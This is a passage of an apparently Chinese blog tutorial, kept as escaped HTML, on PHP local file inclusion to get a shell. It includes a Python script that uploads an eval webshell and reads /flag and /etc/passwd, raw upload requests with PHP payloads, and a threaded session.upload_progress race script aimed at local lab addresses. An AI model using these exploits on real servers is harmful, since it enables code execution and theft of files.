text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Sec-Fetch-Site: same-origin&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Sec-Fetch-Mode: navigate&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Sec-Fetch-User: ?1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Sec-Fetch-Dest: document&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Referer: http://127.0.0.1:18888/file_upload.php&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Accept-Encoding: gzip, deflate&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Accept-Language: zh-CN,zh;q=0.9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Cookie: PHPSESSID=9pji5c42u9migge868i8u083r7; ZDEDebuggerPresent=php,phtml,php3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Connection: close&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;------WebKitFormBoundary6O4h5F4Qzy538QaC&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Content-Disposition: form-data; name=&amp;quot;file&amp;quot;; filename=&amp;quot;123.txt&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Content-Type: text/plain&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;?php phpinfo(); ?&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;------WebKitFormBoundary6O4h5F4Qzy538QaC&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Content-Disposition: form-data; name=&amp;quot;submit&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;提交&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;------WebKitFormBoundary6O4h5F4Qzy538QaC--&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;写 python 包崩溃&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;import requests&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;from io import BytesIO&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;import re&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;files = &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#x27;file&amp;#x27;: BytesIO(&amp;#x27;&amp;lt;?php eval($_REQUEST[sky]);&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;url = &amp;#x27;http://ip/index.php?file=php://filter/string.strip_tags/resource=/etc/passwd&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;try:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;r = requests.post(url=url, files=files, allow_redirects=False)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;except:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;url = &amp;#x27;http://ip/dir.php&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;r = requests.get(url)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;data = re.search(r&amp;quot;php[a-zA-Z0-9]&amp;#123;1,&amp;#125;&amp;quot;, r.content).group(0)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;url = &amp;quot;http://ip/index.php?file=/tmp/&amp;quot;+data&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;data = &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#x27;sky&amp;#x27;:&amp;quot;readfile(&amp;#x27;/flag&amp;#x27;);&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;r =  requests.post(url=url,data=data)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;print r.content&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h2 id=&#34;docker中文件包含&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#docker中文件包含&#34;&gt;#&lt;/a&gt; docker 中文件包含&lt;/h2&gt;
&lt;p&gt;1. 包含日志文件&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;access.log -&amp;gt; /dev/stdout&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;error.log -&amp;gt; /dev/stderr&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;此时日志被重定向到标准输出中，不能包含&lt;/p&gt;
&lt;p&gt;此时包含这些 Web 日志会出现 &lt;code&gt;include(/dev/pts/0): failed to open stream: Permission denied&lt;/code&gt;  的错误，因为 PHP 没有权限包含设备文件：&lt;/p&gt;
&lt;p&gt;远程包含因为默认不开启，所以我们也不作为一个候选项，想要 getshell 还是需要找到一个可以控制内容的文件进行包含。&lt;/p&gt;
&lt;p&gt;2.phpinfo 文件包含&lt;/p&gt;
&lt;p&gt;同样 post 一个大文件，然后利用时间竞争&lt;/p&gt;
&lt;p&gt;脚本和之前的脚本类似，但更改了切片的位置&lt;/p&gt;
&lt;p&gt;&lt;code&gt;fn = d[i+17:i+31]&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;3.Windows 中通配符&lt;/p&gt;
&lt;p&gt;在临时文件包含中，我们详细讲过通配符&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;DOS_STAR：即  &lt;code&gt;&amp;lt;&lt;/code&gt; ，匹配 0 个以上的字符&lt;/li&gt;
&lt;li&gt;DOS_QM：即 &lt;code&gt;&amp;gt;&lt;/code&gt; ，匹配 1 个字符&lt;/li&gt;
&lt;li&gt;DOS_DOT：即 &lt;code&gt;&amp;quot;&lt;/code&gt; ，匹配点号&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;有了通配符，我们就可以匹配临时文件，并修改其内容&lt;/p&gt;
&lt;p&gt;一般我们会用 fputs 和 fopen 写到临时文件中，这样临时文件即使删除，我们可以将我们的马写到其他的目录中&lt;/p&gt;
&lt;p&gt;4.session.upload_progress&lt;/p&gt;
&lt;p&gt;php version &amp;gt; 7&lt;/p&gt;
&lt;p&gt;session.auto_start 顾名思义，如果开启这个选项，则 PHP 在接收请求的时候会自动初始化 Session，不再需要执行 session_start ()。但默认情况下，也是通常情况下，这个选项都是关闭的。&lt;/p&gt;
&lt;p&gt;session.upload_progress 最初是 PHP 为上传进度条设计的一个功能，在上传文件较大的情况下，PHP 将进行流式上传，并将进度信息放在 Session 中（包含用户可控的值），即使此时用户没有初始化 Session，PHP 也会自动初始化 Session。&lt;/p&gt;
&lt;p&gt;PHP 在开启了 &lt;code&gt;session.upload_progress.enable&lt;/code&gt;  后（在包括 Docker 的大部分环境下默认是开启的），将会把用户上传文件的信息保存在 Session 中，而 PHP 的 Session 默认是保存在文件里的。&lt;/p&gt;
&lt;p&gt;利用条件：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;目标环境开启了 &lt;code&gt;session.upload_progress.enable&lt;/code&gt;  选项&lt;/li&gt;
&lt;li&gt;发送一个文件上传请求，其中包含一个文件表单和一个名字是 &lt;code&gt;PHP_SESSION_UPLOAD_PROGRESS&lt;/code&gt;  的字段&lt;/li&gt;
&lt;li&gt;请求的 Cookie 中包含 Session ID&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;构造如下上传包&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;form action=&amp;quot;upload_file.php&amp;quot; method=&amp;quot;post&amp;quot; enctype=&amp;quot;multipart/form-data&amp;quot;&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;lt;label for=&amp;quot;file&amp;quot;&amp;gt;文件名：&amp;lt;/label&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;lt;input type=&amp;quot;file&amp;quot; name=&amp;quot;file&amp;quot; id=&amp;quot;file&amp;quot;&amp;gt;&amp;lt;br&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&amp;lt;input type=&amp;quot;hidden&amp;quot; name=&amp;quot;PHP_SESSION_UPLOAD_PROGRESS&amp;quot; value=&amp;quot;&amp;lt;?php phpinfo(); ?&amp;gt;&amp;quot; /&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;lt;input type=&amp;quot;submit&amp;quot; name=&amp;quot;submit&amp;quot; value=&amp;quot;提交&amp;quot;&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;上传抓包时设置 cookie: PHPSESSID=hahaha&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;POST /web10.php HTTP/1.1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Host: 127.0.0.1:18888&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Content-Length: 426&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Cache-Control: max-age=0&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sec-ch-ua: &amp;quot;Chromium&amp;quot;;v=&amp;quot;97&amp;quot;, &amp;quot; Not;A Brand&amp;quot;;v=&amp;quot;99&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sec-ch-ua-mobile: ?0&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sec-ch-ua-platform: &amp;quot;Windows&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Upgrade-Insecure-Requests: 1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Origin: http://127.0.0.1:18888&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryfiKjPC47H7ESbbdB&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Referer: http://127.0.0.1:18888/file_upload.php&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Accept-Encoding: gzip, deflate&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Accept-Language: zh-CN,zh;q=0.9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Cookie: PHPSESSID=2333333; ZDEDebuggerPresent=php,phtml,php3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Connection: close&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;------WebKitFormBoundaryfiKjPC47H7ESbbdB&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Content-Disposition: form-data; name=&amp;quot;file&amp;quot;; filename=&amp;quot;123.txt&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Content-Type: text/plain&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;nishishabi&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;------WebKitFormBoundaryfiKjPC47H7ESbbdB&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Content-Disposition: form-data; name=&amp;quot;PHP_SESSION_UPLOAD_PROGRESS&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;!DOCTYPE html PUBLIC &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;------WebKitFormBoundaryfiKjPC47H7ESbbdB&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Content-Disposition: form-data; name=&amp;quot;submit&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;提交&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;------WebKitFormBoundaryfiKjPC47H7ESbbdB--&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;上传后我们可以控制文件名，就是我们的 PHPSESSID，但临时文件内容是空的&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221102153200577.png&#34; alt=&#34;image-20221102153200577&#34;&gt;&lt;/p&gt;
&lt;p&gt;可见，我在上传文件的同时，POST 了一个名为 PHP_SESSION_UPLOAD_PROGRESS 的字段，其值为 bbbbbbb。（PHP_SESSION_UPLOAD_PROGRESS 是在 php.ini 里定义的 session.upload_progress.name）只要上传包里带上这个键，PHP 就会自动启用 Session，又因为我在 Cookie 中设置了 PHPSESSID=aaaaaaa，所以 Session 文件将会自动创建。&lt;/p&gt;
&lt;p&gt;但它的大小为什么是 0 呢？因为上传结束后，这个 Session 将会被自动清除（由 session.upload_progress.cleanup 定义），我们只需要条件竞争，赶在文件被清除前利用即可。&lt;/p&gt;
&lt;p&gt;通过竞争实现删除之前包含&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;import io&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;import requests&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;import threading&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sessid = &amp;#x27;23333&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;def t1(session):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    while True:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        f = io.BytesIO(b&amp;#x27;a&amp;#x27; * 1024 * 50)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        response = session.post(&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &amp;#x27;http://127.0.0.1:18888/file_upload.php&amp;#x27;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            data=&amp;#123;&amp;#x27;PHP_SESSION_UPLOAD_PROGRESS&amp;#x27;: &amp;#x27;&amp;lt;?=phpinfo()?&amp;gt;&amp;#x27;&amp;#125;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            files=&amp;#123;&amp;#x27;file&amp;#x27;: (&amp;#x27;a.txt&amp;#x27;, f)&amp;#125;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            cookies=&amp;#123;&amp;#x27;PHPSESSID&amp;#x27;: sessid&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;def t2(session):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    while True:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        response = session.get(f&amp;#x27;http://192.168.1.7/xss_location/include/session_upload.php?file=C:/windows/sess_&amp;#123;sessid&amp;#125;&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        print(response.text)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;with requests.session() as session:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    t1 = threading.Thread(target=t1, args=(session,))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    t1.daemon = True&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    t1.start()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    t2(session)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;code&gt;&amp;lt;?=phpinfo();?&amp;gt;&lt;/code&gt;   可以改为写文件，在自定义的路径下写文件，然后在包含，这样无需解决路径和文件名的问题&lt;/p&gt;
&lt;p&gt;5. 通过 string.strip-tag 导致 php 崩溃&lt;/p&gt;
&lt;p&gt;在 docker 中也是可以用的，具体看上面&lt;/p&gt;
&lt;p&gt;6.pearcmd.php&lt;/p&gt;
&lt;p&gt;pecl 是 PHP 中用于管理扩展而使用的命令行工具，而 pear 是 pecl 依赖的类库。在 7.3 及以前，pecl/pear 是默认安装的；在 7.4 及以后，需要我们在编译 PHP 的时候指定 &lt;code&gt;--with-pear&lt;/code&gt;  才会安装。&lt;/p&gt;
&lt;p&gt;不过，在 Docker 任意版本镜像中，pcel/pear 都会被默认安装，安装的路径在 &lt;code&gt;/usr/local/lib/php&lt;/code&gt; 。&lt;/p&gt;
&lt;p&gt;Docker 环境下的 PHP 会开启 &lt;code&gt;register_argc_argv&lt;/code&gt;  这个配置。当开启了这个选项，用户的输入将会被赋予给 &lt;code&gt;$argc&lt;/code&gt; 、 &lt;code&gt;$argv&lt;/code&gt; 、 &lt;code&gt;$_SERVER[&#39;argv&#39;]&lt;/code&gt;  几个变量。&lt;/p&gt;
&lt;p&gt;这意味着，HTTP 数据包中的 query-string 会被作为 argv 的值&lt;/p&gt;
&lt;p&gt;&lt;code&gt;[PHP 7.3.33 - phpinfo()](http://127.0.0.1:18888/phpinfo.php?uuuuuuu)&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221102164711562.png&#34; alt=&#34;image-20221102164711562&#34;&gt;&lt;/p&gt;
&lt;p&gt;如果 query-string 中不包含没有编码的 &lt;code&gt;=&lt;/code&gt; ，且请求是 GET 或 HEAD，则 query-string 需要被作为命令行参数。&lt;/p&gt;
&lt;p&gt;PHP 现在仍然没有严格按照 RFC 来处理，即使我们传入的 query-string 包含等号，也仍会被赋值给 &lt;code&gt;$_SERVER[&#39;argv&#39;]&lt;/code&gt; 。&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span 